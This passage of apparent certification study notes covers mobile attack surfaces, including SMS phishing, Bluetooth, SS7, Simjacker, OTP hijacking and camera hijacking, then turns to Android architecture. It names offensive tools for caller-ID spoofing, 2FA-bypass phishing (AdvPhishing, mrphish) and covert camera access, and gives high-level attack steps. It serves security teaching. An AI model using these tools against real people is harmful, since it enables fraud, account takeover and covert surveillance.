						- Buffer Overflow: A vulnerability where a program writes more data to a buffer than it can hold, causing it to overwrite adjacent memory. This can result in erratic program behavior, crashes, or unauthorized memory access.
						- Data Caching Exploitation: Mobile devices store cached data to improve performance and conserve resources. Attackers attempt to access these caches to retrieve sensitive stored information.
				- Phone/SMS-Based Attacks:
					- Attackers leverage mobile communication channels to exploit vulnerabilities:
						- Baseband Attacks: Exploiting vulnerabilities in a phone’s GSM/3GPP baseband processor, which is responsible for handling radio signals, to gain unauthorized access or disrupt communication.
						- SMiShing (SMS Phishing): Attackers send deceptive text messages containing malicious links or fraudulent phone numbers. Victims are tricked into clicking the links or calling the numbers, leading to exposure of sensitive information such as Social Security numbers (SSN), credit card details, and online banking credentials.
				- Application-Based Attacks:
					- Mobile applications introduce several security risks:
						- Sensitive Data Storage: Some apps store sensitive user data without adequate security, making them targets for attackers.
						- No Encryption/Weak Encryption: Applications that transmit unencrypted or poorly encrypted data are susceptible to interception and session hijacking.
						- Improper SSL Validation: Flaws in an app’s SSL validation process allow attackers to bypass security measures and intercept data.
						- Configuration Manipulation: Attackers exploit external configuration files and libraries to gain unauthorized access, retrieve plaintext configuration data, or manipulate app settings.
						- Dynamic Runtime Injection: Attackers modify the runtime behavior of an application to bypass security checks, access privileged app components, and steal stored data.
						- Unintended Permissions: Misconfigured apps may inadvertently grant excessive permissions, creating security vulnerabilities.
						- Escalated Privileges: Attackers exploit programming flaws or configuration oversights to gain unauthorized access to restricted resources.
					- Other application-based attacks include UI overlay/pin stealing, third-party code exploitation, intent hijacking, ZIP directory traversal, clipboard data theft, URL scheme manipulation, GPS spoofing, weak/no local authentication, app integrity tampering, side-channel attacks, unprotected app signing keys, app transport security flaws, and XML specialization vulnerabilities.
				- The System (OS-Level Attacks):
					- Operating system vulnerabilities can compromise mobile security:
						- No Passcode/Weak Passcode: Many users fail to set a passcode or use weak passwords, making it easy for attackers to access sensitive data.
						- iOS Jailbreaking: Jailbreaking removes Apple’s security restrictions, exposing the device to malware, performance issues, and security threats.
						- Android Rooting: Rooting grants privileged access to Android’s system files, increasing the risk of data exposure and security breaches.
						- OS Data Caching Exploitation: Attackers can extract sensitive data by rebooting a compromised device with a malicious OS to dump cached memory.
						- Passwords and Data Exposure: Attackers exploit weaknesses in cryptographic algorithms to decrypt iOS Keychains, exposing passwords, encryption keys, and private data.
						- Carrier-Loaded Software Exploitation: Pre-installed apps or software may contain vulnerabilities that attackers use to delete, modify, or steal data and eavesdrop on calls.
						- User-Initiated Code Execution: Attackers trick users into installing malicious applications or clicking links that allow remote code execution, leading to browser, cookie, and security permission exploitation.
					- Other OS-based attack methods include weak encryption, confused deputy attacks, trusted execution environment (TEE) exploitation, side-channel leakage, multimedia/file format parsing vulnerabilities, kernel driver flaws, denial-of-service (DoS) attacks, GPS spoofing, and device lockout bypasses.
			- The Network:
				- Network-based attacks exploit vulnerabilities in wireless and wired communications to intercept, manipulate, or steal sensitive data. Common methods include:
					- Wi-Fi Vulnerabilities (Weak/No Encryption): Some applications fail to encrypt transmitted data or use weak encryption algorithms, making them susceptible to interception. Attackers can eavesdrop on wireless connections to capture sensitive information. While many applications use SSL/TLS for secure transmission, weaknesses in these protocols can still be exploited.
					- Rogue Access Points: Attackers set up unauthorized wireless access points to hijack legitimate network connections. Once users connect, attackers can intercept and manipulate their network traffic.
					- Packet Sniffing: Attackers use tools such as Wireshark and Capsa Free Network Analyzer to capture and inspect network traffic, extracting sensitive information like login credentials sent in plaintext.
					- Man-in-the-Middle (MITM) Attacks: Attackers secretly intercept communications between two parties, allowing them to eavesdrop, modify, or inject malicious data into the conversation without the users' knowledge.
					- Session Hijacking: Attackers steal valid session tokens to impersonate users and gain unauthorized access to their accounts and network resources.
					- DNS Poisoning: Attackers manipulate DNS servers to redirect users to malicious websites by substituting false IP addresses. This technique is commonly used for phishing and malware distribution.
					- SSL Stripping (SSLStrip): A type of MITM attack that downgrades encrypted HTTPS connections to unencrypted HTTP without user awareness. Attackers exploit weaknesses in SSL/TLS implementation, allowing them to intercept sensitive data.
					- Fake SSL Certificates: Attackers generate fraudulent SSL certificates to impersonate legitimate websites, tricking users into believing they are on a secure HTTPS connection while intercepting their communications.
				- Other network-based attacks include BGP hijacking, HTTP proxy interception, and other advanced traffic manipulation techniques.
			- The Data Center/Cloud:
				- Data centers have two primary points of entry: web servers and databases. Attackers exploit vulnerabilities in these components to compromise sensitive data and system integrity.
				- Web Server-Based Attacks:
					- Web server vulnerabilities expose data centers to various security threats, including:
						- Platform Vulnerabilities: Attackers exploit weaknesses in the operating system, web server software (such as IIS or Apache), or application modules running on the server. Additionally, attackers may monitor the communication between a mobile device and a web server to identify protocol or access control weaknesses.
						- Server Misconfiguration: Improperly configured web servers can expose sensitive resources, allowing unauthorized access.
						- Cross-Site Scripting (XSS): XSS attacks occur when attackers inject malicious scripts into dynamically generated web pages, which then execute on users' browsers. Attackers use JavaScript, VBScript, ActiveX, HTML, or Flash to steal sensitive information or manipulate user interactions.
						- Cross-Site Request Forgery (CSRF): Attackers trick authenticated users into performing unintended actions on trusted websites by embedding malicious HTTP requests into web pages they visit. If the user is logged into a legitimate session, the attack executes with their permissions.
						- Weak Input Validation: Many web applications rely on mobile apps to validate user input instead of performing server-side validation. Attackers can bypass these client-side checks and send maliciously crafted requests directly to the web server, leading to cross-site scripting, buffer overflow, and injection attacks.
						- Brute-Force Attacks: Attackers systematically attempt various username-password combinations or other input fields until they find valid credentials. Applications that lack mechanisms to limit repeated login attempts are particularly vulnerable.
					- Other web server-based attacks include cross-origin resource sharing (CORS) misconfigurations, side-channel attacks, hypervisor exploits, VPN vulnerabilities, and more.
				- Database Attacks:
					- Databases store sensitive information, making them a prime target for cyberattacks. Common attack methods include:
						- SQL Injection: Attackers exploit input validation flaws to inject malicious SQL queries through web applications. This allows unauthorized access to databases, enabling data theft, modification, or even deletion.
						- Privilege Escalation: Attackers exploit security flaws to gain elevated access rights within a database, allowing them to access or manipulate sensitive data.
						- Data Dumping: Attackers extract large amounts of data from a compromised database, exposing confidential records.
						- OS Command Execution: Some database management systems allow the execution of operating system commands. Attackers exploit this feature by injecting OS-level commands into database queries, potentially gaining full control over the server.
	- How Hackers Can Profit from Successfully Compromised Mobile Devices (www.sophos.com, securelist.com):
		- Today, smartphones store vast amounts of sensitive information, including images, contact lists, banking apps, social media accounts, emails, financial data, and business-related information. This makes them highly valuable targets for cybercriminals. Android devices, in particular, are more susceptible to hacking due to their large market share. Once a smartphone is compromised, attackers can spy on user activities, misuse stolen data, impersonate the user on social media, or even add the device to a botnet (a network of infected smartphones).
		- Ways Hackers Exploit Compromised Mobile Devices:
			- Surveillance: Accessing audio recordings, camera feeds, call logs, location data, SMS messages, IoT/AI devices, and smart appliances.
			- Financial Exploitation: Sending premium-rate SMS messages, stealing Transaction Authentication Numbers (TANs), deploying ransomware for extortion, distributing fake antivirus software, making expensive calls, and mining cryptocurrency.
			- Data Theft: Extracting account details, contacts, call logs, and phone numbers; exploiting app vulnerabilities to steal data; obtaining the International Mobile Equipment Identity (IMEI) number; and accessing personal health information.
			- Botnet Activity: Using infected devices for Distributed Denial-of-Service (DDoS) attacks, click fraud, and sending premium-rate SMS messages.
			- Impersonation: Redirecting SMS messages, sending fraudulent emails, posting on social media, and stealing passwords.
	- Mobile Attack Vectors and Mobile Platform Vulnerabilities:
		- Mobile Attack Vectors:
			- Mobile devices have become prime targets for attackers due to their widespread use. These devices access many of the same resources as traditional computers but also possess unique features that have introduced new attack vectors and security risks. These attack vectors make mobile platforms vulnerable to malicious attacks, both through network-based threats and physical compromise.
			- Below are some key attack vectors that adversaries exploit to target vulnerabilities in mobile operating systems, device firmware, or mobile applications.
				- Malware: Viruses, rootkits, application modifications, OS modifications
				- Data Exfiltration: Extraction from data streams and emails, screenshot capture and screen scraping, copying to USB devices, loss of backup data
				- Data Tampering: Modification by unauthorized applications, undetected tampering attempts, vulnerabilities in jailbroken devices
				- Data Loss: Application security flaws, unauthorized physical access, device loss
		- Mobile Platform Vulnerabilities and Risks:
			- The increasing adoption of smartphones with rapidly evolving technological features has made mobile device security a critical concern for the IT sector. Cybercriminals are increasingly targeting mobile devices due to significant advancements in both mobile operating systems and hardware. Additionally, enhancements in smartphone capabilities introduce new security challenges.
			- As smartphones surpass PCs as the preferred devices for accessing the internet, managing communications, and handling sensitive data, attackers are investing more effort into researching and implementing new attack strategies. Their goal is to compromise users’ security and privacy—or even gain complete control over victims’ devices.
			- Below are some key vulnerabilities and risks affecting mobile platforms:
				- Malicious apps in app stores
				- Mobile malware
				- App sandboxing vulnerabilities
				- Weak device and app encryption
				- OS and app update issues
				- Jailbreaking and rooting risks
				- Mobile application vulnerabilities
				- Privacy concerns (e.g., geolocation tracking)
				- Weak data security measures
				- Excessive app permissions
				- Weak communication security
				- Physical attacks on devices
				- Insufficient code obfuscation
				- Inadequate transport layer security (TLS)
				- Improper session expiration policies
	- Security Issues Arising from App Stores:
		- Mobile applications are software programs designed to run on smartphones, tablets, and other mobile devices. These applications serve various functions, including messaging, email, media playback, voice recording, gaming, banking, and shopping. Typically, apps are distributed through official app stores operated by mobile OS providers, such as Apple’s App Store, Google Play Store, and Microsoft Store, as well as third-party platforms like the Amazon Appstore, Samsung Galaxy Store, GetJar, and APKMirror.
		- App stores are prime targets for attackers seeking to distribute malware and malicious applications. One common tactic involves downloading a legitimate app, injecting it with malware, and then re-uploading it to a third-party app store, where unsuspecting users download it, believing it to be genuine. Once installed, these malicious apps can compromise user data by accessing and transmitting sensitive information—such as call logs, photos, videos, and documents—to the attacker without the user's knowledge. The stolen data may then be used for further exploitation or cyberattacks.
		- Additionally, attackers may employ social engineering tactics to trick users into downloading and installing apps from sources outside official app stores. The lack of proper app vetting in certain marketplaces increases the risk of malicious and fraudulent apps being distributed. These apps can not only compromise personal data but also damage other applications and system files, leading to security breaches and potential device control by attackers.
	- App Sandboxing Issues:
		- Smartphones are increasingly becoming prime targets for cybercriminals. Mobile app developers must understand the security and privacy risks associated with running non-sandboxed apps and should design applications with proper sandboxing mechanisms in place.
		- App sandboxing is a security mechanism that restricts an application’s access to system resources, limiting it to only the functionality necessary for its intended purpose. This mechanism is particularly useful for executing untested or untrusted code from third-party sources, including suppliers, users, and websites. By isolating applications, sandboxing enhances security by preventing unauthorized interactions between apps, system resources, and malware such as Trojans and viruses.
		- While sandboxing is designed to protect applications from interfering with one another, malicious apps may exploit vulnerabilities to bypass these protections. A secure sandbox environment ensures that an application operates with only the minimum privileges required, preventing it from accessing other users' data or system resources. Conversely, a vulnerable sandbox environment may allow a malicious app to exploit weaknesses, breach the sandbox's perimeter, and compromise sensitive data and system resources.
	- Mobile Spam:
		- Mobile phones are now widely used for both personal and business purposes. Spam refers to unsolicited messages sent via electronic communication technologies such as SMS, MMS, instant messaging (IM), and email. Mobile phone spam—also known as SMS spam, text spam, or m-spam—consists of bulk, unsolicited messages sent to known or unknown phone numbers and email addresses to target mobile users.
		- Common types of spam messages received on mobile devices include:
			- Advertisements or malicious links designed to trick users into revealing confidential information.
			- Commercial messages promoting products or services in an unsolicited manner.
			- Fraudulent prize notifications claiming the recipient has won a prize and instructing them to call a premium-rate phone number for more details.
			- Malicious links intended to lure users into divulging sensitive personal or corporate data.
			- Phishing messages that attempt to deceive recipients into sharing personal or financial information—such as names, addresses, birthdates, bank account details, and credit card numbers—which attackers can use for identity theft or financial fraud.
		- Mobile spam consumes significant network bandwidth and can lead to serious consequences, including financial loss, malware infections, and corporate data breaches.
	- SMS Phishing Attack (SMiShing) – Targeted Attack Analysis:
		- Text messaging is the most prevalent non-voice communication method on mobile phones. Users worldwide send and receive billions of text messages daily. This massive volume of data increases the risk of spam and phishing attacks.
		- SMS phishing, also known as SMiShing, is a type of phishing fraud where attackers use SMS messages to send fraudulent texts. The goal is to trick recipients into revealing personal or financial information by including deceptive links or phone numbers in the message. These messages often contain fake website URLs or telephone numbers designed to lure victims into providing sensitive details such as Social Security numbers (SSNs), credit card numbers, and online banking credentials.
		- In addition to stealing information, attackers may use SMiShing to install malware on victims’ mobile devices or infiltrate associated networks. To execute an attack, criminals often purchase prepaid SMS cards using fake identities. They then send SMS bait messages designed to appear attractive or urgent—such as lottery winnings, gift vouchers, online purchases, or account suspension notices. These messages typically contain a malicious link or phone number.
		- If the recipient clicks the link, believing it to be legitimate, they are redirected to a phishing website that requests personal or financial details (e.g., name, phone number, date of birth, credit card number, PIN, CVV code, SSN, or email address). The attacker can then exploit this stolen information for malicious activities such as identity theft, unauthorized online purchases, and financial fraud.
		- Why Is SMS Phishing Effective?
			- SMS phishing is a highly effective attack method due to several factors:
			- High Open Rates: SMS messages have significantly higher open rates than emails. Most people open and read text messages almost immediately, increasing the attack’s success rate.
			- Trust in SMS: Many users trust SMS more than email, viewing it as a more personal and direct communication channel. This trust reduces skepticism toward fraudulent messages.
			- Limited Space for Links and Content: The character limit in SMS messages forces attackers to craft concise, compelling messages. This makes it harder for recipients to identify phishing attempts, which are often more obvious in longer emails.
			- Lack of Security Awareness: Users are generally less aware of SMS phishing risks than email phishing. While many people recognize email phishing tactics, they are less familiar with SMiShing techniques.
			- Mobile Device Vulnerabilities: Mobile devices typically have fewer security protections than desktop computers. Many users do not install robust security software on their smartphones, making them more vulnerable to attacks.
			- Ease of Impersonation: Attackers can easily spoof phone numbers, making fraudulent messages appear to come from legitimate sources such as banks, government agencies, or well-known companies.
			- Sense of Urgency: Phishing messages often create a false sense of urgency, pressuring recipients to act quickly. For example, messages may warn about a security breach, account suspension, or overdue payment, prompting users to take immediate action without verifying authenticity.
			- Direct Links and Malware Downloads: SMS messages often contain direct links to malicious websites or prompt users to download malware. Because SMS is a fast and convenient communication channel, users are more likely to click on links without hesitation.
			- Prevalence of Shortened URLs: Attackers frequently use URL-shortening services to disguise malicious links. Since shortened URLs are common in SMS communication, they appear legitimate and make it harder for users to detect fraudulent links.
			- Lack of Anti-Phishing Protections: Unlike email services that offer built-in anti-phishing filters and spam protection, SMS lacks robust security mechanisms. As a result, phishing messages can easily reach a victim’s inbox without detection.
		- By understanding these factors, users can take precautions to protect themselves from SMiShing attacks. It is essential to verify the authenticity of SMS messages, avoid clicking on unknown links, and report suspicious messages to prevent falling victim to these scams.
	- Pairing Mobile Devices on Open Bluetooth and Wi-Fi Connections:
		- Setting a mobile device’s Bluetooth connection to "open" or "discovery" mode, along with enabling automatic Wi-Fi connections—especially in public places—poses significant security risks. Attackers exploit these settings to infect mobile devices with malware, such as viruses and Trojans, or compromise unencrypted data transmitted over untrusted networks.
		- Cybercriminals may trick victims into accepting Bluetooth connection requests from malicious devices or conduct Man-in-the-Middle (MITM) attacks, intercepting and compromising data exchanged between connected devices. Using the stolen information, attackers can commit identity fraud and other malicious activities, putting users at significant risk. Techniques such as bluesnarfing and bluebugging allow attackers to eavesdrop on or intercept data transmitted between devices connected over open networks, such as public Wi-Fi or unencrypted routers.
		- Bluesnarfing (Stealing Information via Bluetooth):
			- Bluesnarfing is the unauthorized access and theft of information from a wireless device via a Bluetooth connection. This technique enables an attacker to retrieve sensitive data, including contacts, emails, text messages, photos, videos, and business documents, from vulnerable devices such as smartphones, laptops, tablets, and PDAs.
			- Devices with Bluetooth enabled and set to "discoverable" mode (making them visible to nearby Bluetooth devices) are particularly susceptible to bluesnarfing—especially if they have software vulnerabilities. Attackers can exploit these weaknesses to gain unauthorized access without the victim’s knowledge.
		- Bluebugging (Taking Over a Device via Bluetooth):
			- Bluebugging is a more advanced Bluetooth attack where an attacker gains remote access to a target device and exploits its features without the owner's consent. Before returning control, attackers establish a backdoor, allowing them to:
				- Monitor and intercept phone calls and messages
				- Forward calls and messages to other numbers
				- Read sensitive corporate or personal data
				- Access contacts, photos, and videos
				- Connect to the internet using the victim’s device
				- Perform other unauthorized actions
			- Bluebugging enables attackers to compromise device security, eavesdrop on confidential communications, and conduct various forms of cyber espionage.
		- How to Protect Against These Attacks:
			- To minimize the risk of Bluetooth and Wi-Fi attacks:
			- Keep Bluetooth turned off when not in use
			- Set Bluetooth to "non-discoverable" mode
			- Avoid pairing with unknown or untrusted devices
			- Disable automatic Wi-Fi connections in public places
			- Use encrypted Wi-Fi networks and VPNs for secure browsing
			- Regularly update device software to patch security vulnerabilities
	- Agent Smith Attack:
		Agent Smith attacks are carried out by luring victims into downloading and installing malicious apps disguised as games, photo editors, or other attractive tools from third-party app stores such as 9Apps. Once the user installs the app, the core malicious code infects or replaces legitimate apps on the victim’s mobile device based on commands from a command-and-control (C&C) server.
		- The deceptive application replaces legitimate apps such as WhatsApp, SHAREit, and MX Player with similarly infected versions. It may also masquerade as an authentic Google product, such as Google Updater or Themes. The attacker then generates a massive volume of irrelevant and fraudulent advertisements on the victim’s device through the infected app for financial gain.
		- Additionally, attackers exploit these apps to steal sensitive information, including personal details, login credentials, and banking data, from the victim’s mobile device through C&C commands.
	- Exploiting SS7 Vulnerabilities:
		- Signaling System 7 (SS7) is a communication protocol that enables mobile users to exchange communications through different cellular networks, especially while roaming. Mobile devices are designed to move across locations while maintaining connectivity. The SS7 protocol facilitates this by allowing users to switch telecom operators or connect to different cell towers. However, SS7 operates on a foundation of mutual trust between operators, lacking robust authentication mechanisms.
		- Due to the absence of authentication verification, attackers can exploit SS7 vulnerabilities to conduct Man-in-the-Middle (MITM) attacks, intercepting text messages and calls between communicating devices. This allows them to eavesdrop on bank credentials, one-time passwords (OTPs), and other sensitive information transmitted over the network. Additionally, attackers can bypass two-factor authentication (2FA) and end-to-end encryption via SMS, posing a significant security threat.
		- Threats Associated with SS7 Vulnerabilities:
			- When an attacker gains access to the SS7 protocol, the victim’s device is exposed to several risks, including:
			- Identity Exposure – Revealing the subscriber’s identity
			- Network Intrusion – Disclosing network-related information
			- Data Interception – Spying on and stealing personal data
			- Call and Message Hijacking – Enabling phone tapping
			- Denial-of-Service (DoS) Attacks – Disrupting services and damaging the telecom operator’s reputation
			- Geolocation Tracking – Monitoring the victim’s physical location
	- Simjacker: SIM Card Attack:
		- Simjacker is a vulnerability associated with a SIM card’s S@T browser (SIMalliance Toolbox Browser), a pre-installed software used to execute a set of instructions. Attackers exploit this vulnerability to carry out various malicious activities, such as capturing device location, monitoring calls, collecting information like IMEI, making fraudulent or expensive calls, sending premium-rate messages, forcing the device browser to connect to malicious websites, and launching Denial-of-Service (DoS) attacks to disable SIM cards.
		- The severity of a Simjacker attack depends on the victim’s device. The attack begins when an attacker sends spyware-like code disguised as system or SIM card settings via SMS. Once received, the malicious code allows the attacker to take control of the SIM card and mobile device, executing commands without user interaction.
		- Steps Involved in Simjacker Attack:
			- The attacker sends a fraudulent SMS containing hidden code or instructions from a SIM Application Toolkit (STK).
			- The victim’s device receives the malicious SMS, and the S@T browser on the SIM card automatically recognizes and processes the hidden instructions.
			- The injected code executes various activities on the device without the user’s consent.
			- The attacker’s accomplice device receives user information via SMS, which can be used to track the victim’s live location, exfiltrate device data, and conduct further malicious activities.
	- Call Spoofing:
		- Call spoofing is a technique used by attackers to manipulate the caller ID information displayed on a recipient's phone. This allows them to disguise their phone number as a trusted source, such as a bank or government agency, to trick individuals into sharing sensitive information or paying for unnecessary services. Attackers also use this method to make threatening or harassing phone calls while concealing their identities.
		- Below are some tools that attackers can use to perform call spoofing against a targeted phone number:
		- Call Spoofing Tools:
			- SpoofCard (www.spoofcard.com):
				- SpoofCard allows attackers to use a virtual number to make calls and send texts while concealing their personal information, regardless of location.
				- This tool enables attackers to:
					- Change their voices during calls to sound like a different gender.
					- Add background noise to alter the call environment.
					- Send calls directly to voicemail.
					- Record conversations for later review or upload to cloud services such as Google Drive and Dropbox.
			- Fake Call (play.google.com)
			- SpoofTel (www.spooftel.com)
			- Fake Call and SMS (play.google.com)
			- Fake Caller ID (fakecallerid.io)
			- Phone Id - Fake Caller Buster (play.google.com)
	- OTP Hijacking / Two-Factor Authentication Hijacking:
		- One-time passwords (OTPs) are sent by a server via SMS, an authenticator app, or email to securely authenticate users. Although this feature appears secure, attackers can hijack OTPs and redirect them to their personal devices using various techniques, such as social engineering and SMS jacking. This type of attack is difficult to detect because users may assume a network issue when they fail to receive an OTP—when, in reality, it has been redirected to an attacker-controlled device. Using the stolen OTP, attackers can log into the victim’s online accounts, reset passwords, and steal sensitive information.
		- Attackers typically succeed in OTP hijacking by first obtaining the victim’s personally identifiable information (PII). They may bribe or trick mobile store employees or exploit the reuse of phone numbers assigned to different customers. Additionally, attackers use social engineering techniques to manipulate telecom providers into transferring ownership of the victim’s SIM card. They may falsely claim that their device was lost and request the provider to issue a new SIM, effectively taking control of the victim’s number. Another method involves SIM jacking, where attackers use malware to infect the target device’s SIM card, allowing them to intercept and read OTPs.
		- OTP Hijacking via Lock Screen Notifications:
			- Attackers can also physically steal SMS-based OTPs by monitoring a victim's actions closely. When a user requests an OTP, attackers may view lock screen notifications to obtain the code. This can be achieved through various methods, such as eavesdropping or tricking the user into lending their phone under the pretext of making an emergency call.
		- OTP Hijacking Tools:
			- AdvPhishing: AdvPhishing is a social media phishing tool that helps attackers bypass two-factor authentication (2FA) or OTP verification. It can access the target's IP address and is compatible with Linux and Termux OS. Attackers deploy AdvPhishing on public networks using NGrok tunneling and localhost tunneling. The screenshot below demonstrates how attackers can bypass the two-factor authentication of a victim’s social media account (e.g., Instagram) using AdvPhishing.
			- mrphish: mrphish is a bash-based script designed for phishing social media accounts, featuring port forwarding and OTP bypass capabilities. This tool works on both rooted and non-rooted Android devices.
	- Camera/Microphone Capture Attacks:
		- With the increasing use of personal devices connected to the Internet, significant security concerns have emerged alongside their benefits. Attackers are launching sophisticated attacks on digital users to gain unauthorized access to their devices, steal sensitive data, or compromise device functionality. The following are two common methods attackers use to exploit cameras and microphones on personal devices.
		- Camfecting Attack:
			- A camfecting attack is a form of webcam hijacking in which an attacker gains unauthorized access to a target’s camera. This is typically achieved by infecting the victim’s device with a Remote Access Trojan (RAT). Once compromised, the attacker can access the victim’s camera and microphone, potentially disabling the camera indicator light to avoid detection. Using this method, the attacker can steal sensitive data such as personal photos, recorded videos, and even the victim’s location. Additionally, the attacker can remotely control the camera from anywhere.
			- Steps Involved in Camfecting Attack:
				- The attacker sends a phishing email containing a malicious link or tricks the victim into visiting a compromised website.
				- When the victim clicks the link or visits the malicious website, malware is downloaded and installed on their device, granting remote access to the attacker.
				- The attacker can now capture personal data, including photos and videos, without the victim's knowledge.
		- Android Camera Hijack Attack:
			- Attackers exploit vulnerabilities in Google’s default camera application, which is widely used on Android devices. By leveraging multiple security bypass vulnerabilities, attackers can circumvent permission requirements and gain unauthorized access to the victim’s camera and microphone. Alarmingly, this exploitation can occur even when the mobile device is locked.
			- Android camera applications typically require storage permissions to save photos and videos. These applications request permissions such as:
				- android.permission.CAMERA
				- android.permission.RECORD_AUDIO
				- android.permission.ACCESS_COARSE_LOCATION
				- android.permission.ACCESS_FINE_LOCATION
			- Granting these permissions can provide unrestricted access to the device's internal storage, allowing attackers to:
				- Capture photos and record videos
				- Record voice calls
				- Access stored photos, videos, GPS locations, and other sensitive data
			- Steps Involved in an Android Camera Hijack Attack:
				- Attackers exploit security bypass vulnerabilities by tricking the victim into downloading a malicious app.
				- The malicious app installs a Trojan on the victim’s device without their knowledge.
				- Once the victim starts using the infected application, a persistent connection is established between the attacker and the device.
				- Even if the victim closes the application, the connection remains active, allowing the attacker to stealthily capture photos and record videos.
			- Camera/Microphone Hijacking Tools:
				- StormBreaker (www.github.com): Attackers use the StormBreaker tool for social engineering attacks that hijack camera and microphone access. This tool can retrieve the device’s location, access the webcam, and control the microphone without explicitly requesting permissions from the user.
				- CamPhish (www.github.com)
				- HACK-CAMERA (www.github.com)
				- E-TOOL (github.com)
				- CamOver (www.github.com)
				- CAM-DUMPER (github.com)
- Hacking Android OS:
	- Android is the most popular mobile OS due to its open platform, which allows for extensive application development and customization. However, like other operating systems, Android has certain vulnerabilities, and not all users install security patches to update and protect their OS and apps. This lax approach enables attackers to exploit these vulnerabilities and launch various attacks to steal valuable data from victims' devices.
	- This section explores the Android OS, its architecture, and its associated vulnerabilities. It also covers the process of rooting Android phones, rooting tools, Android Trojans, and hacking techniques used against Android devices. Finally, it provides guidelines for securing Android devices, implementing security controls, and using device-tracking tools.
	- Android OS (developer.android.com):
		- Android is a software environment developed by Google for mobile devices. It includes an operating system (OS), middleware, and key applications. The Android OS is built on the Linux kernel and is an open-source platform.
		- Features:
			- Prebuilt UI Components:
				- Includes structured layout objects and UI controls for building app interfaces.
			- Persistent Data Storage Options:
				- Shared Preferences: Stores private primitive data in key-value pairs.
				- Internal Storage: Saves private data on the device's memory.
				- External Storage: Stores public data on shared external storage.
				- SQLite Databases: Manages structured data in a private database.
				- Network Connection: Allows data storage on a web server via a network.
			- RenderScript:
				- A platform-independent computation engine that runs at the native level, useful for accelerating apps requiring intensive processing power.
			- Connectivity APIs:
				- Provides APIs for interacting with other devices via Bluetooth, Near-Field Communication (NFC), Wi-Fi P2P, USB, and Session Initiation Protocol (SIP), in addition to standard network connections.
			- Application Framework:
				- Enables the reuse and replacement of components.
			- Android Runtime (ART):
				- Optimized for mobile devices, improving performance and efficiency.
			- Integrated Browser:
				- Based on the open-source Blink and WebKit engines.
			- SQLite:
				- Provides structured data storage.
			- Media Support:
				- Compatible with common audio, video, and image formats, including MPEG-4, H.264, MP3, AAC, AMR, JPG, PNG, and GIF.
			- Rich Development Environment:
				- Includes a device emulator, debugging tools, memory and performance profilers, and support for development in the Eclipse IDE.
		- Android OS Architecture:
			- Android is a Linux-based operating system designed for portable devices such as smartphones and tablets. It consists of a stack of software components categorized into six sections: System Apps, Java API Framework, Native C/C++ Libraries, Android Runtime, Hardware Abstraction Layer (HAL), and Linux Kernel, structured across five layers.
			- System Apps:
				- Android system applications reside at the top layer. Any app developed must integrate within this layer. Common pre-installed applications include the dialer, email, calendar, camera, SMS messaging, web browsers, and contact managers. Most Android apps are developed using Java.
			- Java API Framework:
				- The Android platform provides developers with Java-based APIs. The Application Framework offers high-level services that developers incorporate into their apps.
				- Key components of the Application Framework include:
					- Content Providers: Manages data sharing between applications.
					- View System: Supports the development of lists, grids, text boxes, buttons, and other UI elements.
					- Activity Manager: Controls the activity lifecycle of applications.
					- Location Manager: Uses GPS or cell towers to manage location data.
					- Package Manager: Tracks installed applications on the device.
					- Notification Manager: Enables applications to display custom messages in the status bar.
					- Resource Manager: Manages various app resources such as images and layouts.
					- Telephony Manager: Handles voice call functionalities.
					- Window Manager: Manages application windows.
			- Native C/C++ Libraries:
				- This layer contains native libraries written in C or C++, optimized for specific hardware. These libraries allow the device to process various types of data efficiently.
				- Key Native Libraries include:
					- WebKit & Blink: Web browser engines for rendering HTML content.
					- OpenMAX AL: Handles multimedia (audio and video) processing.
					- Libc: Standard C library for system functions.
					- Media Framework: Provides media codecs for recording and playback.
					- OpenGL ES: 2D and 3D graphics rendering library.
					- Surface Manager: Manages display output.
					- SQLite: Lightweight database engine for local data storage.
					- FreeType: Renders fonts.
					- SSL: Ensures internet security.
			- Android Runtime:
				- This layer includes core libraries and the ART (Android Runtime) virtual machine.
				- Android Runtime (ART): From Android 5.0 onwards, each app runs in its own runtime process and instance. ART features:
					- Ahead-of-Time (AOT) compilation
					- Just-in-Time (JIT) compilation
					- Optimized garbage collection (GC)
					- Dalvik Executable (DEX) format for efficient machine code compression.
				- Core Libraries: Provide essential Java libraries required for Android app development.
			- Hardware Abstraction Layer (HAL):
				- HAL serves as a bridge between hardware components and the Java API framework. It abstracts the underlying hardware and provides interfaces for accessing various hardware functionalities, including audio, camera, Bluetooth, sensors, and more.
			- Linux Kernel:
				- At the foundation of Android, the Linux Kernel manages low-level system operations and hardware interactions. This layer includes essential device drivers such as: Audio driver, Binder (IPC) driver, Display driver, Keypad driver, Bluetooth driver, Camera driver, Shared memory driver, USB driver, Wi-Fi driver, Flash memory driver, Power management driver.
				- Key functions of the Linux Kernel include memory management, power management, security enforcement, and networking.
		- Android Device Administration API:
			- The Device Administration API provides system-level device management features. These APIs allow developers to create security-focused applications, particularly useful in enterprise environments where IT professionals need extensive control over employee devices. Developers can use the Device Administration API to create device administration ("admin") applications that users install on their devices. These applications enforce security policies as required.
			- Examples of Applications Using the Device Administration API:
				- Email clients
				- Security applications that perform remote wipe actions
				- Device management services and applications
			- Supported Policies in the Android Device Administration API:
				- Password enabled: Requires devices to prompt users for a PIN or password.
				- Minimum password length: Defines the required number of characters for a password. For example, a minimum of six characters may be mandated.
				- Alphanumeric password required: Enforces passwords to contain a combination of letters and numbers, with optional symbolic characters.
				- Complex password required: Mandates that passwords include at least one letter, one numerical digit, and one special character. (Introduced in Android 3.0)
				- Minimum letters required in password: Specifies the minimum number of letters required in a password. (Introduced in Android 3.0)
				- Minimum lowercase letters required in password: Sets the minimum number of lowercase letters required. (Introduced in Android 3.0)
				- Minimum non-letter characters required in password: Determines the required number of non-letter characters. (Introduced in Android 3.0)
				- Minimum numerical digits required in password: Specifies the minimum number of numerical digits required. (Introduced in Android 3.0)
				- Minimum symbols required in password: Defines the minimum number of special symbols required. (Introduced in Android 3.0)
				- Minimum uppercase letters required in password: Sets the minimum number of uppercase letters required. (Introduced in Android 3.0)
				- Password expiration timeout: Specifies when a password expires, measured in milliseconds from the time an admin sets the expiration. (Introduced in Android 3.0)
				- Password history restriction: Prevents users from reusing the last n unique passwords. Typically used with setPasswordExpirationTimeout(), which forces users to update passwords periodically. (Introduced in Android 3.0)
				- Maximum failed password attempts: Limits the number of incorrect password attempts before the device automatically wipes its data. The API also allows administrators to remotely reset the device to factory defaults, ensuring data security in case of theft or loss.
				- Maximum inactivity time lock: Defines the duration of user inactivity before the screen locks, requiring re-entry of the PIN or password. The timeout range is between 1 and 60 minutes.
				- Require storage encryption: Enforces device storage encryption if supported. (Introduced in Android 3.0)
